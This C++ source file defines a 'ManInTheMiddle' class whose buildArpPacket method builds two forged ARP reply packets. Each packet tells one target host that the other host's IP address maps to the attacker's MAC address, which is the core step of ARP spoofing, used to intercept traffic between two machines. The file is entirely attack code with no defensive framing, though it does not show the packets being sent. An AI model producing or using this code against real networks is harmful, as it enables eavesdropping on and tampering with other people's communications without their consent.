#ifndef MANINTHEMIDDLE_CPP
#define MANINTHEMIDDLE_CPP

#include    "ManInTheMiddle.hh"

ManInTheMiddle::ManInTheMiddle(t_network_data target, t_network_data target2, std::string m)
    :_target(target), _target2(target2), _mac(m)
{
}

ManInTheMiddle::~ManInTheMiddle()
{
}

void    ManInTheMiddle::setTargetData(t_network_data target)
{
    this->_target = target;
}

void    ManInTheMiddle::setTarget2Data(t_network_data target2)
{
    this->_target2 = target2;
}

void    ManInTheMiddle::buildArpPacket()
{
    this->_packet[0].setHtype(1);
    this->_packet[0].setPtype(0x0800);
    this->_packet[0].setHlen(6);
    this->_packet[0].setPlen(4);
    this->_packet[0].setOper(2);
    this->_packet[0].setSha(this->_mac);
    this->_packet[0].setSpa(this->_target2.ip);
    this->_packet[0].setTha(this->_target.mac);
    this->_packet[0].setTpa(this->_target.ip);

    this->_packet[1].setHtype(1);
    this->_packet[1].setPtype(0x0800);
    this->_packet[1].setHlen(6);
    this->_packet[1].setPlen(4);
    this->_packet[1].setOper(2);
    this->_packet[1].setSha(this->_mac);
    this->_packet[1].setSpa(this->_target.ip);
    this->_packet[1].setTha(this->_target2.mac);
    this->_packet[1].setTpa(this->_target2.ip);
}

ARP<Ethernet>   *ManInTheMiddle::getPacket()
{
    return this->_packet;
}

#endif // MANINTHEMIDDLE_CPP

